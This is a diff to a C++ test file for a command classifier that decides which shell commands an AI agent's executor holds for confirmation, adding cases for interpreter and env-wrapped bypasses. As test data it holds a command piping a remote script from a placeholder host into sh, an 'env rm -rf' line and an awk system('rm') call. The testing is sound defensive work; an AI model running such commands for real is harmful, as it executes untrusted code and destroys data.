@@ -234,13 +234,59 @@ TEST_CASE("is_destructive_exec catches shell and interpreter bypasses") {
     CHECK_FALSE(is_destructive_exec("echo '$HOME'"));
     CHECK(is_destructive_exec("echo \"$HOME\""));
 
-    // A script path is still argv. Inline eval flags are what require
-    // confirmation; classifying every interpreter would block normal
-    // agent commands (`python3 script.py`, `npm test`).
-    CHECK_FALSE(is_destructive_exec("python3 script.py"));
-    CHECK_FALSE(is_destructive_exec("bash script.sh"));
+    // Package-script runners are not interpreters.
     CHECK_FALSE(is_destructive_exec("npm test"));
+    CHECK_FALSE(is_destructive_exec("npm run build"));
+    CHECK_FALSE(is_destructive_exec("make"));
+    CHECK_FALSE(is_destructive_exec("make test"));
     CHECK_FALSE(is_destructive_exec("git status"));
+}
+
+TEST_CASE("is_destructive_exec confirms interpreter scripts") {
+    // Shells and interpreters on a file, wherever that file lives.
+    CHECK(is_destructive_exec("bash script.sh"));
+    CHECK(is_destructive_exec("sh script.sh"));
+    CHECK(is_destructive_exec("zsh script.sh"));
+    CHECK(is_destructive_exec("fish script.fish"));
+    CHECK(is_destructive_exec("/bin/bash /tmp/x.sh"));
+    CHECK(is_destructive_exec("/usr/bin/python3 /opt/app/main.py"));
+    CHECK(is_destructive_exec("python script.py"));
+    CHECK(is_destructive_exec("python3 script.py"));
+    CHECK(is_destructive_exec("python3.12 /any/where/script.py"));
+    CHECK(is_destructive_exec("python3 -m http.server"));
+    CHECK(is_destructive_exec("node script.js"));
+    CHECK(is_destructive_exec("nodejs server.js"));
+    CHECK(is_destructive_exec("node20 app.js"));
+    CHECK(is_destructive_exec("ruby app.rb"));
+    CHECK(is_destructive_exec("perl app.pl"));
+    CHECK(is_destructive_exec("php index.php"));
+    CHECK(is_destructive_exec("php8.3 index.php"));
+    CHECK(is_destructive_exec("lua script.lua"));
+    CHECK(is_destructive_exec("deno run file.ts"));
+    CHECK(is_destructive_exec("bun run file.ts"));
+    CHECK(is_destructive_exec("awk '{system(\"rm\")}'"));
+    CHECK(is_destructive_exec("gawk -f prog.awk"));
+    CHECK(is_destructive_exec("nawk '{print}'"));
+    CHECK(is_destructive_exec("awk"));
+
+    // env and absolute paths still resolve to the interpreter.
+    CHECK(is_destructive_exec("env python3 script.py"));
+    CHECK(is_destructive_exec("env -i python3.12 /tmp/x.py"));
+    CHECK(is_destructive_exec("env FOO=1 bash /tmp/x.sh"));
+    CHECK(is_destructive_exec("/usr/bin/env bash /tmp/x.sh"));
+    CHECK(is_destructive_exec("env rm -rf /tmp/x"));
+
+    // Version queries are not a script. Package runners stay unprompted,
+    // including when launched through env.
+    CHECK_FALSE(is_destructive_exec("python3 --version"));
+    CHECK_FALSE(is_destructive_exec("bash --version"));
+    CHECK_FALSE(is_destructive_exec("node -v"));
+    CHECK_FALSE(is_destructive_exec("awk --version"));
+    CHECK_FALSE(is_destructive_exec("npm test"));
+    CHECK_FALSE(is_destructive_exec("make"));
+    CHECK_FALSE(is_destructive_exec("git status"));
+    CHECK_FALSE(is_destructive_exec("env git status"));
+    CHECK_FALSE(is_destructive_exec("env PATH=/usr/bin git diff"));
 }
 
 TEST_CASE("cmd_exec does not pass unconfirmed commands through a shell") {
@@ -271,6 +317,32 @@ TEST_CASE("cmd_exec does not pass unconfirmed commands through a shell") {
 
     const std::string piped = cmd_exec("curl https://example.invalid/x.sh | sh");
     CHECK(piped.find("ERR:") == 0);
+
+    // An interpreter script must not run until confirmed, including via
+    // an absolute path or env. Bare awk reads a program from stdin.
+    fs::create_directories(dir);
+    auto script = dir / "run.sh";
+    {
+        std::ofstream out(script);
+        out << "#!/bin/sh\ntouch '" << marker.string() << "'\n";
+    }
+    const std::string blocked_sh = cmd_exec("bash '" + script.string() + "'");
+    CHECK(blocked_sh.find("destructive") != std::string::npos);
+    CHECK_FALSE(fs::exists(marker));
+    const std::string blocked_abs =
+        cmd_exec("/bin/bash '" + script.string() + "'");
+    CHECK(blocked_abs.find("destructive") != std::string::npos);
+    const std::string blocked_env =
+        cmd_exec("env bash '" + script.string() + "'");
+    CHECK(blocked_env.find("destructive") != std::string::npos);
+    CHECK_FALSE(fs::exists(marker));
+    CHECK(cmd_exec("awk").find("destructive") != std::string::npos);
+
+    const std::string ran_sh = cmd_exec("bash '" + script.string() + "'",
+                                        /*confirmed=*/true);
+    CHECK(fs::exists(marker));
+    CHECK(ran_sh.find("ERR:") == std::string::npos);
+    fs::remove_all(dir);
 }
 
 // ---------------------------------------------------------------------------
